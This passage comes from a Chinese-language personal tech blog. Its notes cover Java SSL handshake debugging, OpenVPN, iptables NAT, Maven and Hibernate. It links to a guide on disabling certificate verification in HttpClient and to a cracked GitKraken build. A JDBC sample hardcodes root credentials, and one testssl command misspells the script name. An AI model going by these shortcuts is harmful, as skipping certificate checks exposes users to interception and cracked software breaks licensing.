(RealInterceptorChain.kt:100)\n    at okhttp3.internal.cache.CacheInterceptor.intercept (CacheInterceptor.kt:96)\n    at okhttp3.internal.http.RealInterceptorChain.proceed (RealInterceptorChain.kt:100)\n    at okhttp3.internal.http.BridgeInterceptor.intercept (BridgeInterceptor.kt:83)\n    at okhttp3.internal.http.RealInterceptorChain.proceed (RealInterceptorChain.kt:100)\n    at okhttp3.internal.http.RetryAndFollowUpInterceptor.intercept (RetryAndFollowUpInterceptor.kt:76)\n    at okhttp3.internal.http.RealInterceptorChain.proceed (RealInterceptorChain.kt:100)\n    at okhttp3.internal.connection.RealCall.getResponseWithInterceptorChain$okhttp (RealCall.kt:197)\n    at okhttp3.internal.connection.RealCall.execute (RealCall.kt:148)\n    at test.App.main (App.java:23)\n    at org.codehaus.mojo.exec.ExecJavaMojo$1.run (ExecJavaMojo.java:254)\n    at java.lang.Thread.run (Thread.java:834)\n```\n\n正在就能證明 JAVA 程式會有問題\n\n## Java 其他驗證\n\n這個也可以直接看到 Exception 錯誤內容\n\n[UniconLabs/java-keystore-ssl-test: A simple script to verify SSL/HTTPS functionality of a remote host through JDK keystore.](https://github.com/UniconLabs/java-keystore-ssl-test)\n\n```bash\nmvn clean package\ncd target\njava -jar java-keystore-test-0.1.0.jar https://google.com.tw\n```\n\n## 其他程式\n\n```bash\ncurl https://xxx\n```\n\ngolang 就用 postman 產生出來吧\n\n## 解決方法\n\napache  VirtualServer 設定\n\nServerName xxx\n\n```xml\n<VirtualHost xxx:443>\nServerName www.example.com\nServerAlias example.com www.example.com\n...\n```\n\n[Client aborts on SNI unrecognized_name warning](https://qualys-secure.force.com/discussions/s/question/0D52L00004TnvXySAJ/client-aborts-on-sni-unrecognizedname-warning)\n[Qualys Labs SSL Test - Incorrect SNI alerts - JERVIS DOT WS](https://jervis.ws/qualys-labs-ssl-test-incorrect-sni-alerts/)\n\n其他相關\n[java - Handshake alert: Unrecognized_name Liberty Profile - Stack Overflow](https://stackoverflow.com/questions/37206209/handshake-alert-unrecognized-name-liberty-profile)\n[10 Online Tool to Test SSL, TLS and Latest Vulnerability - Geekflare](https://geekflare.com/ssl-test-certificate/)\n\n[drwetter/testssl.sh: Testing TLS/SSL encryption anywhere on any port](https://github.com/drwetter/testssl.sh)\ngit clone https://github.com/drwetter/testssl.sh\nchmod a+x testssh.sh\n./testssh.sh google.com\n\n[pornin/TestSSLServer](https://github.com/pornin/TestSSLServer)\n[tord and lion's lair | 各式心得 | 頁 4](https://www.bear2little.net/wordpress/?paged=4)\n\n## 感想\n\n之前[萬用憑證(WildCard)和中間憑證小記 | 程式狂想筆記](https://malagege.github.io/blog/2018/10/10/%E8%90%AC%E7%94%A8%E6%86%91%E8%AD%89-WildCard-%E5%92%8C%E4%B8%AD%E9%96%93%E6%86%91%E8%AD%89%E5%B0%8F%E8%A8%98/)就讓我以為就不會有其他問題\n沒想到 Java 也有憑證這一關(好像是 Java 獨立的)\nQQ 希望之後不要遇到類似這個問題\n\n**2020-07-28**\n## Java SSLPoke 檢查\n\n檢查也有找到這個方法可用[[JAVA] SSL handshake連線測試工具 SSLPoke | 阿輝的零碎筆記 - 點部落](https://dotblogs.com.tw/grayyin/2018/07/12/145718)\n\nSSLPoke.java\n```java\nimport java.io.PrintStream;\nimport javax.net.ssl.SSLHandshakeException;\nimport javax.net.ssl.SSLSocket;\nimport javax.net.ssl.SSLSocketFactory;\n\npublic class SSLPoke\n{\n  public SSLPoke() {}\n  \n  public static void main(String[] paramArrayOfString)\n  {\n    if (paramArrayOfString.length != 2) {\n      System.err.println(\"Utility to debug Java connections to SSL servers\");\n      System.err.println(\"Usage: \");\n      System.err.println(\"  java \" + SSLPoke.class.getName() + \" <host> <port>\");\n      System.err.println(\"or for more debugging:\");\n      System.err.println(\"  java -Djavax.net.debug=ssl \" + SSLPoke.class.getName() + \" <host> <port>\");\n      System.err.println();\n      System.err.println(\"Eg. to test the SSL certificate at https://localhost, use\");\n      System.err.println(\"  java \" + SSLPoke.class.getName() + \" localhost 443\");\n      System.exit(1);\n    }\n    try {\n      SSLSocketFactory localSSLSocketFactory = (SSLSocketFactory)SSLSocketFactory.getDefault();\n      SSLSocket localSSLSocket = (SSLSocket)localSSLSocketFactory.createSocket(paramArrayOfString[0], Integer.parseInt(paramArrayOfString[1]));\n      \n      java.io.InputStream localInputStream = localSSLSocket.getInputStream();\n      java.io.OutputStream localOutputStream = localSSLSocket.getOutputStream();\n      \n\n      localOutputStream.write(1);\n      \n      while (localInputStream.available() > 0) {\n        System.out.print(localInputStream.read());\n      }\n      System.out.println(\"Successfully connected\");\n      System.exit(0);\n    }\n    catch (SSLHandshakeException localSSLHandshakeException) {\n      if (localSSLHandshakeException.getCause() != null) {\n        localSSLHandshakeException.getCause().printStackTrace();\n      } else {\n        localSSLHandshakeException.printStackTrace();\n      }\n    } catch (Exception localException) {\n      localException.printStackTrace();\n    }\n    System.exit(1);\n  }\n}\n```\n\n\n```\n## 先打包成class\n$ javac SSLPoke.java\n$ java SSLPoke www.google.com 443\n```\n連線成功會顯示\n```\n$ java SSLPoke www.google.com 443\nSuccessfully connected\n```\n失敗就會出現一大堆錯\n\n\n\n###  handling exception: javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target\n\n```\n handling exception: javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target\nsun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target\n```\n\n不知道是哪裡出問題\n但後來發現是根憑證沒有這個\n\n1. 指定jks(加好根憑證)或自己加\n```bash\njava -Djavax.net.ssl.trustStore= \n\n# 吃公司內部jks 無可以設定\n#java -Djavax.net.debug=ssl  -Djavax.net.ssl.trustStore=./jssecacerts.jks SSLPoke xxxx.aaa.com.tw 443\n```\n[获取访问目标主机的有效SSL/TLS证书 (无法直接得到证书时)_iihero@CSDN-CSDN博客](https://blog.csdn.net/iihero/article/details/7584162)\n\n2. 程式忽略掉\n[证书不安全解决HttpClient 如何忽略证书验证 - ALLOW_ALL_HOSTNAME_VERIFIER_tiantianchuqiji的博客-CSDN博客](https://blog.csdn.net/tiantianchuqiji/article/details/76639796)"},{"title":"Linux 使用 openvpn 連線小記","url":"%2Fblog%2F2020%2F06%2F25%2FLinux-%E4%BD%BF%E7%94%A8-openvpn-%E9%80%A3%E7%B7%9A%E5%B0%8F%E8%A8%98%2F","content":"\n最近要做測試國外網域的問題\n[VPN Gate: 公共 VPN 中继服务器列表](https://www.vpngate.net/cn/)\n發現 VPN Gate 網站滿多 vpn 資訊\n想使用 Linux 做操作\n找了網路上資源\n真的不是很多\n\n<!--more-->\n\n這邊簡單做一下筆記\n\n```bash\n\n# 前面可以用 VM 開啟，我這邊是用 vagrant\n# 安裝 openvpn\nsudo apt install openvpn tmux\n\n# 下載 openv，可從 vpn gate 那邊下載\nwget https://..../...ovpn 這邊下載檔名不能跟下載不一樣，建議還是用瀏覽器下載\n\n# 開啟 tmux ，因為連接需要多開，\ntmux \n\n# 執行 openvpn\nopenvpn ./xxxx.ovpn\n\n# 切回 command line\nCtrl+b  and d\n\nifconfig\n# enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n#         inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255\n#         inet6 fe80::e8:2fff:fe1c:32d4  prefixlen 64  scopeid 0x20<link>\n#         ether 02:e8:2f:1c:32:d4  txqueuelen 1000  (Ethernet)\n#         RX packets 75995  bytes 94960003 (94.9 MB)\n#         RX errors 0  dropped 0  overruns 0  frame 0\n#         TX packets 13566  bytes 1040385 (1.0 MB)\n#         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\n# lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n#         inet 127.0.0.1  netmask 255.0.0.0\n#         inet6 ::1  prefixlen 128  scopeid 0x10<host>\n#         loop  txqueuelen 1000  (Local Loopback)\n#         RX packets 36  bytes 3512 (3.5 KB)\n#         RX errors 0  dropped 0  overruns 0  frame 0\n#         TX packets 36  bytes 3512 (3.5 KB)\n#         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\n# tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500\n#         inet 10.242.23.205  netmask 255.255.255.255  destination 10.242.23.206\n#         inet6 fe80::aad3:fe27:fda5:76d3  prefixlen 64  scopeid 0x20<link>\n#         unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)\n#         RX packets 2  bytes 1352 (1.3 KB)\n#         RX errors 0  dropped 0  overruns 0  frame 0\n#         TX packets 3  bytes 128 (128.0 B)\n#         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n```\n\n會多一個 interface( tun0 ) 這個部分就是有連接到 vpn \n\n```bash\ncurl ifconfig.me\n\n# 看國家(看流量)\ncurl ipinfo.io\n\n```\n\n完成\n\n","tags":["linux"],"categories":["Linux"]},{"title":"SSL Pinning 和 HSTS 小記","url":"%2Fblog%2F2020%2F06%2F18%2FSSL-Pinning-%E5%92%8C-HSTS-%E5%B0%8F%E8%A8%98%2F","content":"\nTODO: 有空詳細補\n\n<!--more-->\n\n## SSL Pinning\n\n[SSL漏洞修正方式 - SSL憑證推薦網 | SSL憑證 | code Sign](https://www.sslbuyer.com/index.php?option=com_content&view=article&id=177:fix-ssl-vulnerabilities&catid=25&Itemid=2595)\n\n[從 SSL 到 SSL Pinning 看完你就懂！ - 技術雜記 Technology Notes - Jack Yu | 傑克](https://yu-jack.github.io/2020/03/02/ssl-pinning/)\n\n[dialogs/electron-ssl-pinning: Prevents MITM in Electron applications](https://github.com/dialogs/electron-ssl-pinning)\n\n## HSTS\n\nhttps://blog.macs1207.dev/","tags":["hsts"],"categories":["Apache"]},{"title":"GitKraken 使用小記","url":"%2Fblog%2F2020%2F06%2F18%2FGitKraken-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98%2F","content":"\n一些使用小記\n\n<!--more-->\n\n1. branch 資料夾命名，可以在 branch 命 `feature/fixed_bug`\n會產生資料夾\n\n\n2. 左邊介面的分支，可做拖拉 branch  到 別的 branch，會產生合併，非常方便\n\n\n其他:\n- [gitKraken 6.5.0 免收费破解 - 掘金](https://juejin.im/post/5e686b05f265da57553df06d)\n- [GitKraken：和你的私有仓库说再见吧。我：但是，我拒绝 - 知乎](https://zhuanlan.zhihu.com/p/114556763)","tags":["git"],"categories":["Git"]},{"title":"Maven 建置專案初體驗","url":"%2Fblog%2F2020%2F06%2F15%2FMaven-%E5%BB%BA%E7%BD%AE%E5%B0%88%E6%A1%88%E5%88%9D%E9%AB%94%E9%A9%97%2F","content":"\n最近工作機會難得，有空摸 maven\n沒想到想說簡單的建置小專案\n就遇到一堆雷\n在這邊筆記\n\n<!--more-->\n\n## 安裝\n\n我用 chocolate 安裝\n\n安裝可參考:\n[How to Install Apache Maven on Ubuntu 18.04 | Linuxize](https://linuxize.com/post/how-to-install-apache-maven-on-ubuntu-18-04/)\n\n## 請不要使用 Powershell!!\n\n**請不要使用 Powershell!!**\n**請不要使用 Powershell!!**\n**請不要使用 Powershell!!**\n\n很重要，所以我說三遍\n\n就算用爛爛的 cmd ，也不要浪費大量時間處理 powershell \n\n好像是 Powershell -D 會有問題\n我就沒有詳細研究了\n\n[【坑】【maven】在PowerShell窗口下执行maven命令行报错：Unknown lifecycle phase .test.skip=true._三年小白的博客-CSDN博客](https://blog.csdn.net/wushengjun753/article/details/78973618?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase)\n\n用 Powershell Script 大概會看到\n\n```\n[ERROR] Unknown lifecycle phase \"/home/tucson/Projects/kafkaGuideTest/target/Getting-Started-0.0.1-SNAPSHOT.jar\". You must specify a valid lifecycle phase or a goal in the format <plugin-prefix>:<goal> or <plugin-group-id>:<plugin-artifact-id>[:<plugin-version>]:<goal>. Available lifecycle phases are: validate, initialize, generate-sources, process-sources, generate-resources, process-resources, compile, process-classes, generate-test-sources, process-test-sources, generate-test-resources, p rocess-test-resources, test-compile, process-test-classes, test, prepare-package, package, pre-integration-test, integration-test, post-integration-test, verify, install, deploy, pre-site, site, post-site, site-deploy, pre-clean, clean, post-clean. -> [Help 1]\n```\n\n但絕非你的指令錯誤\n\n## 建置 Maven\n\n### 建置新專案\n\nmvn archetype:create\n\nChoose archetype: \t選擇建立Project的範本，預設是99:maven-archetype-quickstart建立一個最基本的Project\nChoose version: \t選擇範本的版本，會列出一些範本可用的版本，其差異是就不用版本的範本可能會建立有不同的資源檔(比如可能附帶圖檔)\n定義groupId: \t輸入要建立Project所隸屬的組織或公司，如我自已用idv.kentyeh.software\n定義artifactId: \t就是Project名稱，例如 firstMaven\n定義version: \tProject的版本號，預設是1.0-SNAPSHOT\n定義package: \t初始建立的Java Package, 如 idv.kentyeh.software\n\n\n#### Archetype有哪些\n\n> Archetype ArtifactIds\t說明\n> maven-archetype-archetype\t產生Archetype專案\n> maven-archetype-j2ee-simple\t產生簡單的J2EE專案\n> maven-archetype-plugin\t產生Maven plugin專案\n> maven-archetype-plugin-site\t產生Maven plugin site專案\n> maven-archetype-portlet\t產生JSR-268 Portlet專案\n> maven-archetype-profiles\t\n> maven-archetype-quickstart\t產生簡單的Maven專案\n> maven-archetype-site\t產生Maven site專案\n> maven-archetype-site-simple\t產生簡單的Maven site專案\n> maven-archetype-webapp\t產生Maven Web App專案\n> \n> \n> 以上最常使用maven-archetype-quickstart建立簡單的Maven專案，\n> 及使用maven-archetype-webapp建立Maven Web專案，剩下的很少用（我個人沒用過）。\n\n[菜鳥工程師 肉豬: Maven 什麼是Archetype](https://matthung0807.blogspot.com/2019/07/maven-archetype.html)\n\n[maven中的groupId和artifactId到底指的是什么？_孙雪峰-CSDN博客](https://blog.csdn.net/snowin1994/article/details/53024871)\n\n\n### 一種快速輸入建置方法\n\nmaven-archetype-quickstart (Java Project)\n\n```bash\nmvn archetype:generate -DgroupId=com.yiibai.core -DartifactId=ProjectName -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=false\n```\nmaven-archetype-webapp (Java Web Project)\n\n```bash\nmvn archetype:generate -DgroupId=com.yiibai.web -DartifactId=ProjectName -DarchetypeArtifactId=maven-archetype-webapp -DinteractiveMode=false\n```\n作者：park\n链接：https://juejin.im/post/5a1e1f76f265da432b4a92cb\n来源：掘金\n著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。\n\n\n題外話:\n[Mave教學 | Maven 初學者中文教程](https://kentyeh.github.io/mavenStartup/index.html)\nmvn archetype:create 我沒辦法使用...\n\n\n## 加入依賴套件\n\n```xml\n <dependencies>\n    <dependency>\n      <groupId>junit</groupId>\n      <artifactId>junit</artifactId>\n      <version>4.11</version>\n      <scope>test</scope>\n    </dependency>\n    <!-- https://mvnrepository.com/artifact/commons-httpclient/commons-httpclient -->\n    <dependency>\n        <groupId>commons-httpclient</groupId>\n        <artifactId>commons-httpclient</artifactId>\n        <version>3.1</version>\n    </dependency>\n  <!-- https://mvnrepository.com/artifact/com.google.code.gson/gson -->\n  <dependency>\n      <groupId>com.google.code.gson</groupId>\n      <artifactId>gson</artifactId>\n      <version>2.2.4</version>\n  </dependency>\n  <!-- https://mvnrepository.com/artifact/net.sf.json-lib/json-lib -->\n  <dependency>\n      <groupId>net.sf.json-lib</groupId>\n      <artifactId>json-lib</artifactId>\n      <version>0.9</version>\n  </dependency>\n  </dependencies>\n  ```\n\n## 編譯 Java\n\nmvn compile\n\n```\n[INFO] Scanning for projects...\n[INFO] \n[INFO] ---------------------------< sample:sample >----------------------------\n[INFO] Building sample 1.0-SNAPSHOT\n[INFO] --------------------------------[ jar ]---------------------------------\n[INFO] \n[INFO] --- maven-resources-plugin:3.0.2:resources (default-resources) @ sample ---\n[INFO] Using 'UTF-8' encoding to copy filtered resources.\n[INFO] skip non existing resourceDirectory /home/xxx/sample/src/main/resources\n[INFO] \n[INFO] --- maven-compiler-plugin:3.8.0:compile (default-compile) @ sample ---\n[INFO] Nothing to compile - all classes are up to date\n[INFO] ------------------------------------------------------------------------\n[INFO] BUILD SUCCESS\n[INFO] ------------------------------------------------------------------------\n[INFO] Total time:  1.488 s\n[INFO] Finished at: 2020-06-15T20:30:00+08:00\n[INFO] ------------------------------------------------------------------------\n```\n\n## 執行 Java\n\nmvn exec:java -Dexec.mainClass=\"sample.App\"\n\n```\n[INFO] Scanning for projects...\n[INFO] \n[INFO] ---------------------------< sample:sample >----------------------------\n[INFO] Building sample 1.0-SNAPSHOT\n[INFO] --------------------------------[ jar ]---------------------------------\n[INFO] \n[INFO] --- exec-maven-plugin:3.0.0:java (default-cli) @ sample ---\nHello World!\n[INFO] ------------------------------------------------------------------------\n[INFO] BUILD SUCCESS\n[INFO] ------------------------------------------------------------------------\n[INFO] Total time:  1.573 s\n[INFO] Finished at: 2020-06-15T20:31:19+08:00\n[INFO] ------------------------------------------------------------------------\n```\n\n## 使用 mvn \n\n在 win 我寫簡單 bat\n\n```bat\ncall mvn compile\ncall mvn exec:java -Dexec.mainClass=\"sample.ExampleGetToken\"\npause\n```\n\n這邊我踩到一個地雷\nmvn 前面需要加 call\n\n> 但是總是在執行的時候執行完一個mvn 目標後自動退出，pause命令也無效，分析原因為mvn本身是一個bat命令，因此在exit退出的時候，整個指令碼程序將退出，加入call命令呼叫即可。\n\n參考來源:[呼叫maven命令的BAT指令碼分享 | 程式前沿](https://codertw.com/%E5%89%8D%E7%AB%AF%E9%96%8B%E7%99%BC/388797/)\n\n### 科普小知識\n\nLinux 沒有 pause\n\n```bash\n# method 1\nread -n 1 -p \"Press any key to continue...\"\n\n# method 2 \nread -n 1 -p \"Press any key to continue...\" INP\nif [ $INP != '' ] ; then\n        echo -ne '\\b \\n'\nfi\n```\n\n```bash\n#! /bin/bash\nfunction pause(){\n        read -n 1 -p \"$*\" INP\n        if [ $INP != '' ] ; then\n                echo -ne '\\b \\n'\n        fi\n}\n \n#使用時：\npause 'Press any key to continue...'\n```\n\n好啦，其實用 Linux 應該都是打指令呼叫程式\n應該比較不會有 window 問題\n\n其他資源:\n- [bat結合maven 實現windows下maven自動打包指令碼 - IT閱讀](https://www.itread01.com/content/1544963239.html)\n- [【坑】【maven】在PowerShell窗口下执行maven命令行报错：Unknown lifecycle phase .test.skip=true._三年小白的博客-CSDN博客](https://blog.csdn.net/wushengjun753/article/details/78973618?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase)\n- [Maven创建项目时出现Generating project in Interactive mode就一直卡住的解决方案_程高伟-CSDN博客](https://blog.csdn.net/frankcheng5143/article/details/51813479)\n- [菜鳥工程師 肉豬: Maven 什麼是Archetype](https://matthung0807.blogspot.com/2019/07/maven-archetype.html)\n- [使用Maven模板创建项目 - 掘金](https://juejin.im/post/5a1e1f76f265da432b4a92cb)\n- [整合 Maven 與 Yeoman，學習筆記 (2) - 使用 mvn archetype:generate 建立 JAX-RS / Jersey 專案 | 格物致知](https://amobiz.github.io/2013/12/27/integrating-maven-and-yeoman-study-notes-2-mvn-archetype-generate-jersey/)\n- [How to Install Apache Maven on Ubuntu 18.04 | Linuxize](https://linuxize.com/post/how-to-install-apache-maven-on-ubuntu-18-04/)","tags":["mvn"],"categories":["Java"]},{"title":"使用 iptables 實做 NAT 轉發封包","url":"%2Fblog%2F2020%2F06%2F14%2F%E4%BD%BF%E7%94%A8-iptables-%E5%AF%A6%E5%81%9A-NAT-%E8%BD%89%E7%99%BC%E5%B0%81%E5%8C%85%2F","content":"\n之前有跟別的公司合作取得三組 VPN 帳號密碼\n但是我們團隊有 10 人\n這三組怎麼做\n雖然最近專案已經結束了\n我有看到使用 Linux iptables 設定 NAT 轉發封包\n今天就簡單嘗試\n\n<!--more-->\n\n## 網路知識\n\n~~臨時抱佛腳時間~~\n\n### 預設閘道\n\n一般我的常設定 IP ，都會設定預設閘道\n預設閘道通常都是設定中華電信小烏龜\n~~一般可能不會去了解原因~~\n這邊簡呆說明一下原因\n之前幾篇有講到 CIDR\n現在正常設定 IP 都會設定 Mask (網路遮罩)\n只要超過遮罩時候，**就會轉發到 預設閘道**\n就會根據路由器做轉發到別的網域\n\n### NAT\n\nwifi 連線的時候，會自動分配 IP (DHCP)\n通常拿到的 IP 都是私有網域 IP\n所以外面的網路通常 PING 不到\n\n#### SNAT\n\n[鳥哥的 Linux 私房菜 -- Linux 防火牆與 NAT 伺服器](http://linux.vbird.org/linux_server/0250simple_firewall.php#fig9.1-2)\n\n#### DNAT\n\n一般常用的就是 Virtual Server，這就是一種 DNAT\n\n\n[鳥哥的 Linux 私房菜 -- Linux 防火牆與 NAT 伺服器](http://linux.vbird.org/linux_server/0250simple_firewall.php#fig9.1-3)\n\n### 其他小記\n\n#### Windows 10 和 Linux 如何轉發 IP\n\n每一台電腦都可以擔任轉發動作，但一開始我在**預設閘道**怎麼沒有效果\n其實都需要設定\n\n```\nPS: 小補轉發跨網域會發生什麼事情\n一般轉發不會改變來源 IP\n跨網域後封包不會送回來\n```\n\nWin 10\n\n> 2、windows xp、Vista、windows7：\n> \n> 打开注册表：regedit.exe\n> \n> 打到：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\n> \n> 增加：\n> Value Name: IpEnableRouterData Type: REG_DWORD\n> \n> Value: 1\n> \n> 重启机器。\n> ————————————————\n> 版权声明：本文为CSDN博主「kl222」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。\n> 原文链接：https://blog.csdn.net/kl222/java/article/details/12878755\n\n[打开windows的路由功能_康林工作室-CSDN博客](https://blog.csdn.net/kl222/article/details/12878755)\n\nlinux\n\n一般在設定 iptables forward\n但前置作業記得要先做這個動作\n\n> 查詢IP forward功能是否開啟\n> cat /proc/sys/net/ipv4/ip_forward\n> 0代表沒有啟動\n> 1代表已啟動\n> \n> 暫時啟動IP forward功能\n> echo 1 > /proc/sys/net/ipv4/ip_forward\n> 重新開機就會失效\n> \n> 永久開啟IP forward功能\n> vi /etc/sysctl.conf\n> 加上這句\n> net.ipv4.ip_forward = 1\n> 立刻讓設定生效\n> sysctl -p\n\n[IP forward @ 小志的隨便記 :: 痞客邦 ::](https://danshuei.pixnet.net/blog/post/119262469-ip-forward)\n\n## 如何 SNAT 轉發\n\n不錯文章\n- [Linux ip forward - sparkdev - 博客园](https://www.cnblogs.com/sparkdev/p/9262825.html)\n- [如何在 Linux 下利用 iptables 快速設定 NAT 環境 | The Will Will Web](https://blog.miniasp.com/post/2010/06/08/Setup-NAT-environment-using-iptables-under-Linux)\n\n\n我這邊簡單實作讓另外一台沒網路用預設閘道連線\n參考保哥範例如下\n\nNAT(PC):\nwlp3s0: 192.168.1.117 (可以連線出去網段)\nwlp3s0: 192.168.100.2 （環境要做 NAT 網段)\n\nPC(一般):\nIP: 192.168.100.50(起設定在 192.168.100.0/24 範圍內)\nMask: 255.255.255.0\nGateway: 192.168.100.2\n\n```bash\n# 1. Define variables\n## WAN_IF 是設定轉發出去 IP & 從哪邊轉發出去\n## 我這邊是 Linux 在 1 個 Wifi Interface 做 2 個 IP\n## 這邊我主要是對另一台做連線動作\n## 保哥範例是 PPPOE ，這邊可以設定 VPN Interface\n\nWAN_IF=\"wlp3s0\"\nWAN_IP=\"192.168.1.117\"\n\n## 進來 IP 做轉發，通常是設定區域網路 IP 範圍\n## 這邊我也是用同一個 Interface\n\nLAN_IF=\"wlp3s0\"\nLAN_IP=\"192.168.100.0/24\"\n\n\n# 2. modprobe\n\n/sbin/modprobe ip_tables\n/sbin/modprobe iptable_filter\n/sbin/modprobe ip_conntrack\n/sbin/modprobe ip_conntrack_ftp\n/sbin/modprobe ip_conntrack_irc\n/sbin/modprobe ipt_state\n/sbin/modprobe ipt_limit\n/sbin/modprobe ipt_REJECT\n/sbin/modprobe ipt_REDIRECT\n/sbin/modprobe ipt_LOG\n\n\n# 3. Flush & Reset iptables settings\n\n/sbin/iptables -F\n/sbin/iptables -X\n/sbin/iptables -Z\n/sbin/iptables -F -t nat\n/sbin/iptables -X -t nat\n/sbin/iptables -Z -t nat\n/sbin/iptables -P INPUT DROP\n/sbin/iptables -P OUTPUT ACCEPT\n/sbin/iptables -P FORWARD ACCEPT\n/sbin/iptables -t nat -P PREROUTING ACCEPT\n/sbin/iptables -t nat -P POSTROUTING ACCEPT\n/sbin/iptables -t nat -P OUTPUT ACCEPT\n\n\n# 4. Accept connection from LOCALHOST ( loopback )\n\n/sbin/iptables -A INPUT -i lo -j ACCEPT\n\n\n# 5. Acception connection from some ports ( Firewall rules )\n\n# /sbin/iptables -A INPUT -m state --state NEW -p tcp --dport 80 -j ACCEPT\n\n# 6. Source NAT settings\n\n/sbin/iptables -A INPUT -i $LAN_IF -j ACCEPT\necho \"1\" > /proc/sys/net/ipv4/ip_forward\n/sbin/iptables -A POSTROUTING -t nat -o $WAN_IF -s $LAN_IP -j SNAT --to $WAN_IP\n\n# 8. Accept connection from ESTABLISHED and RELATED connection\n\n/sbin/iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n```\n\nDNAT 就是這一段了\n我有空研究再補\n通常對方沒設定 SNAT 的時候\n只能設定 DNAT(或安全因素)\n\n```\n/sbin/iptables -t nat -A PREROUTING -p tcp -i ppp0 --dport 80 -j DNAT --to 192.168.100.104:80\n```\n\n最後設定這個不如使用 VPN 實做會不會比較方便?\n有時間研究\n\n## 番外 iptables 可以設定對網域做調整\n\n[Blocking HTTP requests via Iptables for a specific domain – Defragged](https://defragged.org/2020/03/14/blocking-http-requests-via-iptables-for-a-specific-domain/)\n","tags":["iptables"],"categories":["Linux"]},{"title":"Linux 查詢執行很久程式方法","url":"%2Fblog%2F2020%2F06%2F09%2FLinux-%E6%9F%A5%E8%A9%A2%E5%9F%B7%E8%A1%8C%E5%BE%88%E4%B9%85%E7%A8%8B%E5%BC%8F%E6%96%B9%E6%B3%95%2F","content":"\n[Kill all processes that are running for more than 5 minutes by a given user in linux bash script - Server Fault](https://serverfault.com/questions/166034/kill-all-processes-that-are-running-for-more-than-5-minutes-by-a-given-user-in-l)"},{"title":"Hibernate 建置起手式","url":"%2Fblog%2F2020%2F06%2F02%2FHibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B%2F","content":"\nTODO: hibernate 尚未整理完成\n\n<!--more-->\n\n\n## 介紹 Hibernate \n\n\n## 傳統 JDBC 查詢 SQL\n\n```java\nClass.forName(\"com.mysql.jdbc.Driver\");\nConnection conn = DriverManage.getConnection(url,username,password);\nString sql = \"SELECT * FROM user\";\nPreparedStatment psmt = conn.prepareStatment(sql);\n\nResultSet rs = pstm.executeQuery();\n\n// while rs ....\nconn.close();\n```\n\n一開始學 Java 我們都是這樣寫的\n沒有仔細探討寫法\n\n首先是 Class.forName\n因為 Class.forName 有 static 執行 `DriverManager.registerDriver(new Driver)`\n\n[JWorld@TW Java論壇 - Re:請問Class.forName()的用途](https://www.javaworld.com.tw/jute/post/view?bid=29&id=52014)\n\n```java\n\npublic class JdbcDemo {\n    public static void main(String[] args) throws SQLException, ClassNotFoundException {\n        String url = \"jdbc:mysql://127.0.0.1:3306/mydb\";\n        String username = \"root\";\n        String password = \"redhat\";\n        //Class.forName(\"com.mysql.jdbc.Driver\");\n        DriverManager.registerDriver(new Driver());\n        Connection connection = DriverManager.getConnection(url, username, password);\n        String sql = \"SELECT * FROM msg\";\n        PreparedStatement prepareStatement = connection.prepareStatement(sql);\n        ResultSet resultSet = prepareStatement.executeQuery();\n        resultSet.next();\n        String address = resultSet.getString(\"address\");\n        System.out.println(address);\n    }\n}\n```\n> 發現代碼，還是正常的執行了。\n> \n> 總結一下: Class.forName 方法的作用，就是初始化給定的類。而我們給定的 MySQL 的 Driver 類中，它在靜態代碼塊中通過 JDBC 的 DriverManager 註冊了一下驅動。我們也可以直接使用 JDBC 的驅動管理器註冊 mysql 驅動，從而代替使用 Class.forName。\n\n參考來源:[Java class.forname 詳解 | 菜鳥教程](https://www.runoob.com/w3cnote/java-class-forname.html)\n\n\n## Hibernate\n\n\n## 前置設定\n\n### jar 加載\n\n1. Hibernate jar 包\n下載連結[5.4 series - Hibernate ORM](https://hibernate.org/orm/releases/5.4/)\nlib/required,lib/jpa\n底下需要載入jar\n\n\n2. Hibernate 日誌 jar 包\n\n3. DB 驅動 Jar 包\nMySQL JDBC驅動程式(mysql-connector-java-*.jar)\n\n### Maven 設定\n\n設定檔原則上要放在 src 跟目錄，但\n\n[Java程式教學甘仔店: Hibernate Hello World Example 專案 之 XML Mapping](http://pclevin.blogspot.com/2015/01/hibernate-hello-world-example-xml.html)\n\n\n#### 探討 Eclipse 加 resource 資料夾\n\n其中 resources 是會抓到 target \n```bash\n# copy resources to target\ncp -rf $PROJECT_DIR/resources/* $PROJECT_DIR/target\n```\n詳細可以看 javac 編譯:[第1期：抛开IDE，了解一下javac如何编译 | 毛帅的博客](https://imshuai.com/using-javac)\n這篇可以有時間再做整理\n\n## 設定 Hibernate\n\n### 加入 dtd 用意\n\n\n\n### 設定實體類 hbm.xml\n\n```xml\n\n```\n\n### 設定 Hibernate 核心檔\n\n需要放在 src 底下，除非有做 resource (還需要設定 